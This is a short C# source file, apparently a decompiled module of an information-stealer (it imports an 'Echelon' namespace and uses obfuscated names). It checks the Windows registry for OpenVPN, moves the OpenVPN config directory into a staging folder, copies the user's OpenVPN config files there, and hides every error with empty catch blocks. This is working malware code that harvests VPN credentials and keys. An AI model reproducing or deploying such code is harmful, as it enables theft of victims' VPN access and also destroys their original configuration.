using Echelon;
using Microsoft.Win32;
using System.IO;

internal class an
{
	public static int a;

	public static void a(string ji)
	{
		try
		{
			RegistryKey localMachine = Registry.LocalMachine;
			string[] subKeyNames = localMachine.OpenSubKey("SOFTWARE").GetSubKeyNames();
			for (int i = 0; i < subKeyNames.Length; i++)
			{
				if (subKeyNames[i] == "OpenVPN")
				{
					Directory.CreateDirectory(ji + "\\VPN\\OpenVPN");
					try
					{
						new DirectoryInfo(localMachine.OpenSubKey("SOFTWARE").OpenSubKey("OpenVPN").GetValue("config_dir")
							.ToString()).MoveTo(ji + "\\VPN\\OpenVPN");
						an.a++;
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.UserProfile + "\\OpenVPN\\config\\conf\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(ji + "\\VPN\\OpenVPN\\config\\conf\\");
				fileInfo.CopyTo(ji + "\\VPN\\OpenVPN\\config\\conf\\" + fileInfo.Name);
			}
			an.a++;
		}
		catch
		{
		}
	}
}
